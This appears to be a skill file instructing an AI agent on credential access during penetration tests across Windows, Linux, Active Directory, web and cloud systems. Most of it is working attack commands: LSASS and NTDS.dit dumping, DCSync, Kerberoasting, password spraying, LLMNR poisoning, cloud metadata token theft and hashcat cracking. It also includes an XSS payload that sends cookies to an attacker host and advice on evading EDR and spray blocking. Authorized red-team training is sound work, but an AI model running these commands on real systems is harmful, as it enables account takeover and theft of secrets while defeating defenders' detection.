---
name: credential-access
description: Identify, extract, validate, and document credentials across Windows, Linux, Active Directory, web applications, and cloud environments during penetration testing.
---

# Credential Access Skill (TA0006)

## Overview
Identify, extract, validate, and document credentials across Windows, Linux, Active Directory,
web applications, and cloud environments. Operate within explicit scope with strong redaction.

## Scope Rules
1. Only operate on explicitly in-scope hosts, apps, and data sources.
2. External targets: credential extraction requires explicit authorization (external_exploit=explicit_only).
3. Prefer offline analysis; avoid online guessing unless explicitly authorized.
4. Redact secrets in reports; store raw data only in approved evidence storage.
5. Limit brute-force attempts to authorized password policies (lockout-aware).

---

## Decision Tree: Choosing Credential Techniques

```
START → What OS/platform?
├── Windows (local admin?)
│   ├── YES → LSASS dump, SAM/SYSTEM, DPAPI, Vault, browser stores
│   ├── NO (domain user) → Kerberoasting, AS-REP Roast, LLMNR poison, token theft
│   └── Domain Controller? → NTDS.dit, DCSync, certificate theft
├── Linux (root?)
│   ├── YES → /etc/shadow, SSH keys, memory scrape, config files
│   └── NO → .bash_history, user SSH keys, readable configs, /proc/*/environ
├── Active Directory
│   ├── Any domain user → Kerberoasting, AS-REP Roast, password spray
│   ├── DA/privileged → DCSync, NTDS.dit extraction, DPAPI domain backup key
│   └── Network position → LLMNR/NBT-NS poisoning, NTLM relay
├── Web Application
│   ├── SQLi available → Dump user tables, extract hashes
│   ├── Session access → Steal cookies, JWT tokens, OAuth tokens
│   └── Config access → Database connection strings, API keys
└── Cloud (AWS/Azure/GCP)
    ├── Compute instance → Metadata API (169.254.169.254), env vars, IAM roles
    ├── Storage → S3/Blob/GCS for leaked credentials, .env files
    └── Identity → Service principal keys, managed identity tokens
```

---

## Methodology

### 1. Credential Discovery
- Enumerate credential storage locations based on target OS and access level.
- Identify service accounts, cached credentials, and stored secrets.
- Capture metadata and minimal proof of exposure before extraction.

### 2. Windows Credential Extraction

#### LSASS Memory Dump
```
# Procdump (SysInternals — less detected)
procdump.exe -accepteula -ma lsass.exe lsass.dmp

# Mimikatz direct
mimikatz # privilege::debug
mimikatz # sekurlsa::logonpasswords

# Nanodump (stealthier — direct syscalls)
nanodump.exe --write C:\Temp\lsass.dmp

# Comsvcs.dll (LOLBin — no upload needed)
rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump <LSASS_PID> C:\Temp\lsass.dmp full

# Parse dump offline
mimikatz # sekurlsa::minidump lsass.dmp
mimikatz # sekurlsa::logonpasswords
# Or: pypykatz lsa minidump lsass.dmp
```

#### SAM/SYSTEM Registry Hives
```
reg save HKLM\SAM C:\Temp\SAM
reg save HKLM\SYSTEM C:\Temp\SYSTEM
reg save HKLM\SECURITY C:\Temp\SECURITY
# Parse offline
impacket-secretsdump -sam SAM -system SYSTEM -security SECURITY LOCAL
```

#### NTDS.dit (Domain Controller)
```
# Ntdsutil
ntdsutil "activate instance ntds" "ifm" "create full C:\Temp\ntds" quit quit

# Volume Shadow Copy
vssadmin create shadow /for=C:
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\NTDS\ntds.dit C:\Temp\ntds.dit
copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy1\Windows\System32\config\SYSTEM C:\Temp\SYSTEM

# Parse offline
impacket-secretsdump -ntds ntds.dit -system SYSTEM LOCAL
```

#### DPAPI / Credential Vault / WiFi / Browsers
```
# DPAPI master keys + credentials
mimikatz # dpapi::cred /in:C:\Users\<user>\AppData\Roaming\Microsoft\Credentials\<GUID>
mimikatz # dpapi::masterkey /in:<masterkey> /rpc   # domain backup key

# Windows Vault
mimikatz # vault::cred
vaultcmd /list

# WiFi passwords
netsh wlan show profiles
netsh wlan show profile name="<SSID>" key=clear

# Browser credential stores
lazagne.exe browsers
SharpChromium.exe logins
```

### 3. Linux Credential Hunting

```
# Shadow file (requires root)
cat /etc/shadow
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# History files
cat ~/.bash_history ~/.zsh_history ~/.mysql_history
grep -i 'pass\|secret\|key\|token' ~/.*history

# SSH keys
find / -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" 2>/dev/null
find / -name "authorized_keys" 2>/dev/null
cat ~/.ssh/config

# Configuration files with credentials
grep -rli 'password\|passwd\|secret\|api_key' /etc/ /opt/ /var/ 2>/dev/null
find / -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name ".env" 2>/dev/null | head -50
cat /etc/fstab     # NFS/CIFS credentials
cat /etc/exports

# Memory strings (root)
strings /proc/*/maps 2>/dev/null | grep -i password
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -i pass

# Process credential leaks
ps auxwwe | grep -i 'pass\|key\|secret'

# Database configs
cat /etc/mysql/debian.cnf
cat /var/www/*/wp-config.php
cat /var/www/*/.env
```

### 4. Active Directory Attacks

```
# Kerberoasting — extract TGS hashes for offline cracking
impacket-GetUserSPNs domain.local/user:pass -dc-ip <DC_IP> -request -outputfile kerberoast.txt
# Or: Rubeus.exe kerberoast /outfile:kerberoast.txt

# AS-REP Roasting — users without pre-auth
impacket-GetNPUsers domain.local/ -usersfile users.txt -dc-ip <DC_IP> -format hashcat -outputfile asrep.txt
# Or: Rubeus.exe asreproast /outfile:asrep.txt

# DCSync — requires Replicating Directory Changes privilege
impacket-secretsdump domain.local/admin:pass@<DC_IP> -just-dc-ntlm
mimikatz # lsadump::dcsync /domain:domain.local /user:krbtgt

# Password Spray
kerbrute passwordspray --dc <DC_IP> -d domain.local users.txt 'Spring2025!'
crackmapexec smb <DC_IP> -u users.txt -p 'Spring2025!' --continue-on-success

# LLMNR/NBT-NS Poisoning
responder -I eth0 -wrfv
# Captured NTLMv2 hashes → crack with hashcat -m 5600
```

### 5. Web Application Credentials

```
# SQL injection user dump
sqlmap -u "http://target/page?id=1" --dump -T users -D webapp
sqlmap -u "http://target/page?id=1" --passwords

# Session token theft
# Capture cookies via XSS: <script>document.location='http://attacker/steal?c='+document.cookie</script>

# JWT secret extraction
# Crack weak JWT secrets:
hashcat -m 16500 jwt_token.txt wordlist.txt
# jwt_tool: python3 jwt_tool.py <token> -C -d wordlist.txt

# OAuth token theft — redirect_uri manipulation, token leakage in referrer
```

### 6. Cloud Credentials

```
# AWS — metadata API
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<role-name>
# AWS env vars
env | grep -i AWS
cat ~/.aws/credentials

# Azure — managed identity token
curl -H "Metadata: true" "http://169.254.169.254/metadata/identity/oauth2/token?api-version=2018-02-01&resource=https://management.azure.com/"
cat ~/.azure/accessTokens.json

# GCP — service account keys + metadata
curl -H "Metadata-Flavor: Google" http://169.254.169.254/computeMetadata/v1/instance/service-accounts/default/token
find / -name "*.json" -exec grep -l "private_key" {} \; 2>/dev/null
```

### 7. Password Cracking

```
# Hashcat — identify hash type
hashcat --identify hash.txt
hashid hash.txt

# Dictionary attack
hashcat -m <mode> hash.txt wordlist.txt

# Rules-based attack
hashcat -m <mode> hash.txt wordlist.txt -r /usr/share/hashcat/rules/best64.rule
hashcat -m <mode> hash.txt wordlist.txt -r /usr/share/hashcat/rules/OneRuleToRuleThemAll.rule

# Mask attack (brute-force with pattern)
hashcat -m <mode> hash.txt -a 3 ?u?l?l?l?l?d?d?d    # Uppercase+4lower+3digits
hashcat -m <mode> hash.txt -a 3 ?a?a?a?a?a?a?a?a      # All chars, 8 length

# Combinator attack
hashcat -m <mode> hash.txt -a 1 wordlist1.txt wordlist2.txt

# Common hash modes: 0=MD5, 100=SHA1, 1000=NTLM, 1800=sha512crypt,
#   3200=bcrypt, 5600=NTLMv2, 13100=Kerberoast, 18200=AS-REP
```

---

## Evidence Collection
1. `credentials.json` — structured fields: username, password (redacted), host, port, protocol, service, verified
2. `creds.json` — redacted evidence with counts
3. `evidence.json` — source metadata and proof points
4. `findings.json` — exposure impact notes

## Evidence Consolidation
Use `parse_hashcat_show.py` to summarize offline cracking outputs into `creds.json`.

## OPSEC Ratings Per Technique

| Technique | Noise | Risk |
|-----------|-------|------|
| Config file reads, browser cred files, offline cracking | 🟢 Quiet | Minimal |
| SAM/SYSTEM export, DPAPI extraction | 🟢🟡 | Low-Med |
| LSASS dump, remote secretsdump, Kerberoasting | 🟡 Moderate | Medium |
| AS-REP roasting, single-target NTLM relay | 🟡 Moderate | Medium |
| Password spraying, DCSync, LLMNR poisoning, brute force | 🔴 Loud | High |

Full OPSEC details: `references/opsec_credentials.md`

---

## Attack Path Decision Tree

```
What access do you have?
├── No credentials (network position only)
│   ├── LLMNR/NBT-NS poison → capture NTLMv2 → relay or crack
│   ├── Responder → ntlmrelayx → shadow creds / RBCD
│   └── Password spray (1 pass / 30 min, check lockout policy first)
├── Domain user (low privilege)
│   ├── Windows/AD → Kerberoast → AS-REP roast → ADCS abuse (ESC1-8)
│   ├── Linux → config files, .bash_history, SSH keys, /proc creds
│   └── Cloud → metadata API (169.254.169.254), env vars, credential files
├── Local admin (single host)
│   ├── Windows → LSASS dump → SAM/SYSTEM → DPAPI → browser stores
│   ├── Linux root → /etc/shadow → SSH keys → service configs
│   └── Check for cached domain creds → pivot to domain
├── Domain admin / high privilege
│   ├── DCSync → full domain hashes → crack offline
│   ├── NTDS.dit extraction → offline parsing
│   ├── DPAPI domain backup key → decrypt all user secrets
│   └── Golden/Diamond Ticket for persistence
└── Cloud admin
    ├── AWS → SSM Parameter Store, Secrets Manager, Lambda env vars
    ├── Azure → Key Vault, managed identity tokens
    └── GCP → Secret Manager, service account keys
```

---

## Credential Quality Assessment

Priority when multiple credential types available:

| Priority | Type | Usability |
|----------|------|-----------|
| 1 | Plaintext password | Works everywhere — all protocols, web, RDP |
| 2 | NTLM hash | Pass-the-hash to SMB, WMI, WinRM, DCOM |
| 3 | NTLMv2 hash | Crack offline or relay (cannot pass-the-hash) |
| 4 | Kerberos TGT/TGS | Pass-the-ticket to Kerberos services only |
| 5 | Certificate (PFX) | Pass-the-cert → TGT → NTLM (survives password reset) |
| 6 | Encrypted blob/token | Decrypt with keys or use within existing session |

**Rule:** Always try credential reuse before cracking. A cracked password from one service often unlocks many others.

---

## Skill Chaining

### Chain From (receives input from):
- **exploitation** → shells, local access → extract local creds
- **lateral_movement** → access to new hosts → dump creds on each
- **initial_access** → phishing creds, VPN creds → validate and expand
- **recon/enumeration** → usernames, email formats → spray targets

### Chain To (feeds output to):
- **lateral_movement** → plaintext creds, NTLM hashes → pass-the-hash, RDP, SSH
- **persistence** → Golden Ticket (krbtgt hash), certificates, domain backup keys
- **privilege_escalation** → service account creds → higher privilege access
- **data_exfiltration** → database creds → access sensitive data stores

### Common Multi-Step Chains
Full chain walkthroughs with exact commands: `references/credential_chains.md`

---

## When Attacks Fail

**LSASS protected?** → SAM dump, DPAPI, cached creds, comsvcs.dll MiniDump
**Hashes won't crack?** → Progressive rules (best64 → OneRule → dive), org-specific masks, pass-the-hash instead
**No Kerberoastable SPNs?** → AS-REP roast, targeted Kerberoast (set SPN on writable user), gMSA enumeration
**Spray getting blocked?** → Reduce rate, Kerberos instead of SMB, web portal, IP rotation
**No cleartext?** → Pass-the-hash, pass-the-ticket, overpass-the-hash, browser session cookies

Full recovery playbooks: `references/failure_recovery_creds.md`

---

## OPSEC Considerations
- LSASS dumps trigger EDR — prefer comsvcs.dll or nanodump over mimikatz on disk
- Kerberoasting is stealthier than password spraying (no lockouts)
- DCSync generates DC replication traffic — detectable by SIEM
- Responder poisoning is noisy on monitored networks
- Hashcat GPU cracking is local and undetectable by target

## Examples
See [examples/kerberoast-chain.md](examples/kerberoast-chain.md) for Kerberoasting to domain admin.
See [examples/lsass-dump-offline.md](examples/lsass-dump-offline.md) for LSASS dump and offline parsing.
See [examples/linux-cred-hunt.md](examples/linux-cred-hunt.md) for Linux credential hunting workflow.

---

## Deep Dives
Load references when needed:
1. Windows credential dumps: `references/windows_credential_dump.md`
2. Linux credential hunting: `references/linux_credential_hunt.md`
3. AD credential attacks: `references/ad_credential_attacks.md`
4. Web credential attacks: `references/web_credential_attacks.md`
5. Password cracking: `references/password_cracking.md`
6. **Advanced attacks (DPAPI, Kerberos, NTLM relay, ADCS, cloud):** `references/advanced_credential_attacks.md`
7. **Multi-step credential chains:** `references/credential_chains.md`
8. **OPSEC per technique:** `references/opsec_credentials.md`
9. **Failure recovery playbooks:** `references/failure_recovery_creds.md`
10. Legacy refs: `references/scope_authorization.md`, `references/redaction.md`

## Success Criteria
- Credential exposure identified across all accessible platforms
- Evidence captured with proper redaction
- Hash types identified and cracking attempted where authorized
- MITRE techniques tagged per finding
- No unauthorized credential collection performed
- OPSEC noise level assessed before each technique
- Credential chains documented with exact commands and expected output
